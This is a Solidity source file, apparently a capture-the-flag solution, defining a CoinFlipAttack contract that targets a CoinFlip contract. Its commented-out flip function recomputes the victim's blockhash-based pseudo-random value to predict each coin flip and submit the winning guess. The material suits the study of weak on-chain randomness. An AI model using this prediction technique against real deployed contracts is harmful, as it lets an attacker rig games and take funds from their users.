// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

/*
Import the vulnerable contract so we can later
instantiate it and call its functions
*/
import "./SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;
    uint256 public consecutiveWins;
    address public owner;
    uint256 lastHash;
    // Same number as in CoinFlip contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;

    constructor() public {
        consecutiveWins = 0;
        owner = msg.sender;
    }

    CoinFlip public victimContract;

    // constructor(address _addr) public {
    //     victimContract = CoinFlip(_addr);
    // }

    /*
    Public function to set the victim contract. We will call this first in our exploit.
    It could have also been done in a constructor.
    */
    function setVictim(address _addr) public returns (address) {
        /* 
        Note that here we are not calling CoinFlip constructor with an address,
        but just instantiating it and setting its address. All functions calls will be sent to that address.
        This is a Solidity quirk, get used to it :)
        */
        victimContract = CoinFlip(_addr);
        return address(victimContract);
    }

    /*
    Public function which mimics the PRNG in CoinFlip and then calls CoinFlip with the correct guess.
    */
    // function flip() public returns (bool) {
    //     // Same PRNG as in victim contract
    //     // The "random" numbers will be exactly the same in both contracts
    //     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    //     uint256 coinFlip = blockValue.div(FACTOR);
    //     side = coinFlip == 1 ? true : false;

    //     // Here we call the victim contract flip function with our guess
    //     return bool(victimContract.flip(side));
    // }

    // function testFlip(bool _guess) public returns (bool) {
    //     uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    //     if (lastHash == blockValue) {
    //         revert();
    //     }

    //     lastHash = blockValue;
    //     uint256 coinFlip = blockValue.div(FACTOR);
    //     bool side = coinFlip == 1 ? true : false;

    //     if (side == _guess) {
    //         consecutiveWins++;
    //         return true;
    //     } else {
    //         consecutiveWins = 0;
    //         return false;
    //     }
    // }
}
